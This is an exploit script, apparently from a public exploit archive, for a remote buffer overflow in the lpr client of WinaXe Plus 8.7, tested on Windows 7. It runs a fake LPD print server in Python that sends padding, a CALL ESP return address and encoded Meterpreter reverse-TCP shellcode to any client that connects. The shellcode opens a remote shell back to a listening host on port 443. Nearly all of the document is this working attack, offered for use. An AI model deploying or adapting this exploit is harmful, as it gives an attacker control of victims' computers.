# Exploit Title: WinaXe Plus 8.7 - lpr remote buffer overflow
# Tested on: Windows 7 Ultimate x64
# Connet lpr to this fake print server

import socket
 
# Bad Chars Identified \x00 \x0A \x0D  
# Return Address CALL ESP 0x100299d9
# windows/meterpreter/reverse_ord_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\xbb\x10\xbe\xde\x1a\xdb\xc1\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x1f\x83\xc0\x04\x31\x58\x0e\x03\x48"
shellcode += "\xb0\x3c\xef\xd2\xf9\x27\x83\x59\xdb\x60\x7d\xe9"
shellcode += "\xff\x84\x26\x38\xc9\xd4\xcf\x0b\x99\x05\x73\x83"
shellcode += "\xe5\x29\x23\x69\x13\x48\x44\xf8\x09\x79\xb9\x34"
shellcode += "\xba\xe4\x7d\x8c\x9d\xcf\xd9\xa3\x6c\x51\xc8\x54"
shellcode += "\xb0\xa9\x71\xc6\x57\x74\x9a\x57\x12\xfa\xbb\x1d"
shellcode += "\xed\xe2\x7a\xbe\xa4\xf3\x27\x93\x15\x95\x01\x34"
shellcode += "\xcc\xd8\x47\x64\x13\x0e\x26\x39\xcf\xaa\x79\xa4"
shellcode += "\x2d\xa0\xca\x62\x1c\xf2\xf7\xcd\x1f\xbc\xd6\x46"
shellcode += "\xdc\x69\x06\xd7\xd4\x37\x4e\x9a\xdc\x92\xa3\xac"
shellcode += "\xc4\x1d\xf0\x6a\xf3\xb3\x1c\x75\x95\x75\xa1\x89"
shellcode += "\xa9\xe8\xa4"

payload = 'njoffsec' * 64 + '\xd9\x99\x02\x10' + '\x90\x90' + shellcode + '\x90\x90' + 'pwned' + 'njoffsec' * 66

port = 515              
s = socket.socket()
ip = '0.0.0.0'             
s.bind((ip, port))            
s.listen(5)                    
 
print 'Fake server listening on LPD port: ' + str(port)
 
while True:
    conn, addr = s.accept()     
    conn.send(payload)
    conn.close()
